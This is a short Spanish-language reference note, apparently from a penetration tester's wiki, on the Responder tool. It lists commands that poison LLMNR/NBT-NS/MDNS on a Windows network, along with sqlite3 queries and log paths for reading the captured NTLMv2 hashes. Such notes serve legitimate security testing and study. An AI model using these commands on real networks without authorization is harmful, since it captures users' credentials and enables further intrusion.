---
title: Responder
resumen: Captura hashes de autenticación en redes Windows envenenando LLMNR, NBT-NS y MDNS.
tags: poisoning
---

Herramienta utilizada para capturar hashes de autenticación en redes Windows, mediante ataques de envenenamiento de protocolos como LLMNR, NBT-NS y MDNS. Sirve para obtener credenciales de usuarios en la red local.

> Archivo de configuración: `/usr/share/responder/Responder.conf`
> Si un puerto ya está ocupado: comprobar con `lsof -i:X` y parar el servicio con `service X stop`.

```bash
# Modo escucha/análisis en una interfaz específica
sudo responder -l tun0

# Envenenar la red SIN responder a SMB/HTTP (útil para no interferir con otros ataques en curso)
sudo responder -I tun0 -dw
```

| Flag | Descripción |
|---|---|
| `-I` | Interfaz de red por donde se hace el ataque |

### Gestión de la base de datos temporal

```bash
# Entrar en la base de datos de Responder
sqlite3 Responder.db

# Listar tablas
.tables

# Ver los usuarios y sus hashes NTLMv2 capturados
SELECT * FROM responder;

# Salir
.quit
```

> Logs de envenenamiento SMB: `/usr/share/responder/logs/SMB-NTLMv2-*.txt`
> Borrar la base de datos si se quiere volver a capturar los mismos hashes.

### Técnicas donde aparece

[[llmnr-nbtns-poisoning]] · [[smb-relay]]
